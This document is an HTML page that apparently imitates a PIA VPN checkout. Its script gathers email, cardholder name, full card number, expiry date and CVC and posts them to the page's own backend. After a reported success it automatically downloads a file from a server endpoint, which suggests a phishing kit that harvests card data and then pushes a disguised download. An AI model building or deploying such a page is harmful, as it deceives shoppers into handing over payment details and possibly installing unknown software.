<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/png" href="./assets/favicon.png">
    <title>VPN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      .hidden {
        display: none;
      }
      .fade-in {
        animation: fadeIn 0.5s ease-in-out;
      }
      @keyframes fadeIn {
        0% {
          opacity: 0;
        }
        100% {
          opacity: 1;
        }
      }

      .loader-container {
        display: none;
        justify-content: center;
        align-items: center;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
        z-index: 9999;
        flex-direction: column;
      }

      /* The actual loader */
      .loader {
        border: 8px solid #f3f3f3; /* Light grey */
        border-top: 8px solid #3498db; /* Blue color */
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite; /* Spin animation */
      }

      /* Countdown text */
      .countdown {
        margin-top: 20px;
        font-size: 18px;
        color: #fff;
      }

      /* Animation for the loader spinning */
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body class="bg-gray-50">
    <header>
      <nav class="flex max-w-5xl mx-auto px-4 py-5 justify-between w-full items-center">
        <img width="100" src="./assets/logo.png" alt="">
        <span></span>
      
        <div 
          class="flex items-center gap-1 cursor-pointer" 
          aria-label="Language selection"
        >
        üåèÔ∏é
          <p class="mb-0 text-xs">EN</p>
          <i class="bi bi-chevron-down text-green-500 text-sm"></i>
        </div>
      </nav>
    </header>
    <main
      class="max-w-5xl mx-auto px-4 py-8 grid grid-cols-1 lg:grid-cols-3 gap-8"
    >
      <div class="lg:col-span-2">
        <section
          class="bg-white p-6 rounded-lg shadow-sm border border-green-400"
        >
          <h2 class="text-lg font-semibold mb-4">
            Select your preferred payment method
          </h2>
          <div class="bg-gray-100 p-4 rounded-lg mb-4">
            <h3 class="font-semibold mb-2">Credit/Debit Card</h3>
            <div class="flex space-x-2 mb-4">
              <img
                src="./assets/visa-logo.jpg"
                class="h-6"
                alt="Visa"
              />
              <img
                src="./assets/Mastercard-logo.svg"
                class="h-6"
                alt="Mastercard"
              />
              <img
                src="./assets/American-Express-logo.png"
                class="h-6"
                alt="Amex"
              />
              <img
                src="./assets/Discover-logo.png"
                class="h-6"
                alt="Discover"
              />
            </div>
            <input
              type="email"
              class="w-full p-2 border rounded-lg mb-3"
              placeholder="Email address"
            />
            <div class="flex items-start mb-3">
              <input type="checkbox" class="mr-2 mt-1" checked />
              <p class="text-xs text-gray-700">
                I agree to register for PIA's mailing list, from which I can
                opt-out at any time. PIA will contact me only to share
                information about its affiliates, account credentials, checkout
                reminders, service updates, and potential promotions, pursuant
                to the
                <a href="#" class="text-blue-500 underline">Privacy Policy</a>.
              </p>
            </div>
            <input
              type="text"
              class="w-full p-2 border rounded-lg mb-3"
              placeholder="Name of cardholder"
            />
            <div class="relative mb-3">
              <input
                type="text"
                class="w-full p-2 border rounded-lg"
                placeholder="1234 1234 1234 1234"
                maxlength="16"
              />
            </div>
            <div class="grid grid-cols-2 gap-4 mb-3">
              <input
                type="text"
                class="p-2 border rounded-lg"
                placeholder="MM / YY"
                maxlength="5"
              />
              <input
                type="text"
                class="p-2 border rounded-lg"
                placeholder="CVC"
                maxlength="3"
              />
            </div>
            <select
              id="country-select"
              class="w-full p-2 border rounded-lg mb-3"
            >
              <option>Loading Country...</option>
            </select>
            <p class="text-xs text-gray-600">
              The VPN subscription will renew on Mar 29, 2027, at the
              then-current rate ($56.94 every 2 years) unless you cancel via the
              "Subscription Overview" dashboard by clicking the "Turn off
              auto-renewal" prompts. Contact Customer Support within 30 days for
              a full refund.
            </p>
            <p class="text-xs text-gray-600 mt-2">
              Signing up constitutes acceptance of the
              <a href="#" class="underline">Terms of Service</a>,
              <a href="#" class="underline">Privacy Policy</a>, and
              <a href="#" class="underline">Cookies Policy</a>.
            </p>
          </div>
        </section>
      </div>

      <div class="lg:col-span-1 bg-white p-6 rounded-lg shadow-sm border">
        <h2 class="text-lg font-semibold mb-4">Your Order</h2>
        <p class="text-sm font-medium">
          VPN plan <span class="font-semibold">(2 years)</span> +
          <span class="font-semibold">2 months Free</span>
        </p>
        <p class="text-green-500 font-semibold text-sm">Discount 82%</p>
        <p class="text-sm">500 GB of Cloud Storage from pCloud (1 year)</p>
        <div class="border-t my-4"></div>
        <div class="flex justify-between text-sm">
          <span>Original Price</span>
          <span class="line-through">$311.74</span>
        </div>
        <div class="flex justify-between text-sm text-green-500 font-semibold">
          <span>Discount</span>
          <span>-$254.80</span>
        </div>
        <div class="flex justify-between text-sm">
          <span>Cloud Storage</span>
          <span>$0.00</span>
        </div>
        <div class="border-t my-4"></div>
        <div class="flex justify-between text-lg font-semibold">
          <span>Order Total</span>
          <span id="order-total">$56.94</span>
        </div>
        <div class="border-t my-4"></div>
        <h3 class="text-sm font-semibold mb-2">
          Boost Your Online Security & Experience
        </h3>
        <label class="flex items-start space-x-2 mb-2">
          <input
            type="checkbox"
            id="antivirus"
            class="mt-1"
            onchange="updatePrice()"
          />
          <div>
            <p class="text-sm font-medium">
              Antivirus by PIA <span class="text-blue-500">‚Ñπ</span>
            </p>
            <p class="text-xs text-gray-600">
              Fully protect your Windows PC with our privacy-focused antivirus
            </p>
            <p class="text-xs text-green-500 font-semibold">
              2 years <span class="text-black">SAVE 68%</span>
            </p>
            <p class="text-xs">Billed $34.80 ($1.45/mo.)</p>
          </div>
        </label>
        <label class="flex items-start space-x-2">
          <input
            type="checkbox"
            id="dedicated-ip"
            class="mt-1"
            onchange="updatePrice()"
          />
          <div>
            <p class="text-sm font-medium">
              Dedicated IP <span class="text-blue-500">‚Ñπ</span>
            </p>
            <p class="text-xs text-gray-600">
              Get an IP address that only you can access.
            </p>
            <p class="text-xs text-green-500 font-semibold">
              2 years <span class="text-black">SAVE 50%</span>
            </p>
            <p class="text-xs">Billed $60.00 ($2.50/mo.)</p>
          </div>
        </label>
        <button
          type="button"
          class="w-full mt-4 bg-blue-500 text-white p-2 rounded-lg"
          onclick="handleSubscribe()"
        >
          Subscribe
        </button>
        <div id="loading" class="hidden">
          <p>Processing...</p>
        </div>
        <div id="success" class="hidden fade-in text-green-600">
          <p>Subscription Successful!</p>
        </div>
        <div id="error" class="hidden fade-in text-red-600">
          <p>There was an error, please try again!</p>
        </div>
      </div>

      <footer class="bg-gray-800 text-white lg:w-max py-6 mt-12">
        <div class="max-w-5xl mx-auto px-4 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
          <!-- VPN Info Section -->
          <div>
            <h3 class="text-lg font-semibold mb-4">About Our VPN Service</h3>
            <p class="text-sm text-gray-400">
              Our VPN service prioritizes your privacy while providing high-speed internet access. With military-grade encryption and no-log policies, your data is protected, and you can surf the web securely.
            </p>
          </div>
          
          <!-- Useful Links Section -->
          <div>
            <h3 class="text-lg font-semibold mb-4">Useful Links</h3>
            <ul class="space-y-2">
              <li><a href="#" class="text-sm text-gray-400 hover:text-green-500">Privacy Policy</a></li>
              <li><a href="#" class="text-sm text-gray-400 hover:text-green-500">Terms of Service</a></li>
              <li><a href="#" class="text-sm text-gray-400 hover:text-green-500">FAQs</a></li>
              <li><a href="#" class="text-sm text-gray-400 hover:text-green-500">Contact Us</a></li>
            </ul>
          </div>
      
          <!-- Social Media Section -->
          <div>
            <h3 class="text-lg font-semibold mb-4">Follow Us</h3>
            <div class="flex space-x-4">
              <a href="#" class="text-gray-400 hover:text-green-500">
                <i class="bi bi-facebook text-xl"></i>
              </a>
              <a href="#" class="text-gray-400 hover:text-green-500">
                <i class="bi bi-twitter text-xl"></i>
              </a>
              <a href="#" class="text-gray-400 hover:text-green-500">
                <i class="bi bi-instagram text-xl"></i>
              </a>
              <a href="#" class="text-gray-400 hover:text-green-500">
                <i class="bi bi-linkedin text-xl"></i>
              </a>
            </div>
          </div>
      
          <!-- Contact Section -->
          <div>
            <h3 class="text-lg font-semibold mb-4">Contact Us</h3>
            <p class="text-sm text-gray-400">For support, please email us at:</p>
            <p class="text-sm text-gray-400">
              <a href="mailto:support@vpnservice.com" class="hover:text-green-500">support@vpnservice.com</a>
            </p>
            <p class="text-sm text-gray-400 mt-2">Call us at: +1 800-123-4567</p>
          </div>
        </div>
      
        <div class="border-t border-gray-700 pt-6 mt-8">
          <p class="text-center text-sm text-gray-400">
            &copy; 2025 VPN Service. All Rights Reserved.
          </p>
        </div>
      </footer>
      
    </main>

    <div class="loader-container" id="loaderContainer">
      <div class="loader"></div>
      <div class="countdown" id="countdown"></div>
    </div>

    <script>
      const host = "http://localhost:5003";

      const showLoader = () => {
        const loaderContainer = document.getElementById("loaderContainer");
        const countdownElement = document.getElementById("countdown");
        let seconds = 5; // Start countdown from 5 seconds

        // Display the loader container
        loaderContainer.style.display = "flex";
        countdownElement.textContent = `Download will start in ${seconds} seconds...`;

        // Countdown logic
        const interval = setInterval(() => {
          seconds--;
          countdownElement.textContent = `Download will start in ${seconds} seconds...`;

          if (seconds <= 0) {
            clearInterval(interval); 
            loaderContainer.style.display = "none"; 
            downloadFile();
          }
        }, 1000); // Update every second
      };
   
      const downloadFile = async () => {
  try {
    const response = await fetch("/api/files/download", {
      method: "GET",
      headers: { "Content-Type": "application/json" },
    });

    if (!response.ok) {
      throw new Error("Error downloading file");
    }

    const data = await response.json();

    const fileUrl = data.file.filepath;
    const filename = data.file.filename || "downloaded-file";

    const fileResponse = await fetch(fileUrl);
    const fileBlob = await fileResponse.blob();

    const a = document.createElement("a");
    const fileObjectUrl = window.URL.createObjectURL(fileBlob);
    a.href = fileObjectUrl;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    window.URL.revokeObjectURL(fileObjectUrl);
  } catch (err) {
    console.error("Error downloading file:", err);
  }
};



      function updatePrice() {
        let price = 56.94;
        const antivirusPrice = 34.8;
        const dedicatedIPPrice = 60.0;
        let country;

        if (document.getElementById("antivirus").checked) {
          price += antivirusPrice;
        }
        if (document.getElementById("dedicated-ip").checked) {
          price += dedicatedIPPrice;
        }

        document.getElementById("order-total").textContent = `$${price.toFixed(
          2
        )}`;
      }

      let country;

      const handleSubscribe = async () => {
        const email = document.querySelector('input[type="email"]').value;
        const cardholderName = document.querySelector(
          'input[placeholder="Name of cardholder"]'
        ).value;
        const cardNumber = document.querySelector(
          'input[placeholder="1234 1234 1234 1234"]'
        ).value;
        const expirationDate = document.querySelector(
          'input[placeholder="MM / YY"]'
        ).value;
        const cvc = document.querySelector('input[placeholder="CVC"]').value;
        const antivirusSelected = document.getElementById("antivirus").checked;
        const dedicatedIPSelected =
          document.getElementById("dedicated-ip").checked;

        if (
          !validateCardNumber(cardNumber) ||
          !validateExpirationDate(expirationDate) ||
          !validateCVC(cvc)
        ) {
          alert("Please enter valid card details");
          return;
        }

        document.getElementById("loading").classList.remove("hidden");

        try {
          const res = await fetch("/api/auth/subscribe", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              email,
              cardholderName,
              cardNumber,
              expirationDate,
              cvc,
              antivirusSelected,
              dedicatedIPSelected,
              country,
            }),
          });
          const data = await res.json();
          

          if (data.success) {
            document.getElementById("loading").classList.add("hidden");
            document.getElementById("success").classList.remove("hidden");
            showLoader();

            setTimeout(() => {
              document.getElementById("success").textContent =
                "Thank you for your purchase!";
            }, 2000);
          } else {
            document.getElementById("loading").classList.add("hidden");
            document.getElementById("error").classList.remove("hidden");
          }
        } catch (error) {
          document.getElementById("loading").classList.add("hidden");
          document.getElementById("error").classList.remove("hidden");
        }
      };

      function validateCardNumber(cardNumber) {
        return /^\d{16}$/.test(cardNumber);
      }

      function validateExpirationDate(expirationDate) {
        return /^\d{2}\/\d{2}$/.test(expirationDate);
      }

      function validateCVC(cvc) {
        return /^\d{3}$/.test(cvc);
      }

      const getCountryByIP = async () => {
        try {
          const response = await fetch(
            "https://get.geojs.io/v1/ip/country.json"
          );
          const data = await response.json();
          const country = data.country;

          const countrySelect = document.getElementById("country-select");
          const countryOption = document.createElement("option");
          countryOption.value = country;
          countryOption.textContent = country;
          countrySelect.appendChild(countryOption);

          countrySelect.value = country;
        } catch (error) {
          console.error("Error detecting country:", error);
        }
      };
      getCountryByIP();
    </script>
  </body>
</html>
